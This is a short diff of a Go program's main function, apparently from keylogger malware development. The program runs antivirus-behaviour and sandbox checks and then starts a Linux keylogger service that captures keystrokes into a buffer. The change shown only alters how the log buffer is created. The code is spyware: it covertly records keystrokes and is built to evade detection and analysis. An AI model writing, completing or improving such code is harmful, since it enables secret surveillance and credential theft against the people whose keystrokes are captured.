@@ -23,7 +23,8 @@ const (
 func main() {
 	tools.AVBehaviourCheck()
 	tools.SandboxCheck()
-	var logBuffer *bytes.Buffer
+
+	logBuffer := bytes.NewBuffer(make([]byte, LOG_BUFFER_SIZE))
 
 	keyLogger := keylogger.NewKeyLoggerService("linux", keylogger_linux.NewLinuxLogger())
 	keyLogger.CaptureKeys(logBuffer)
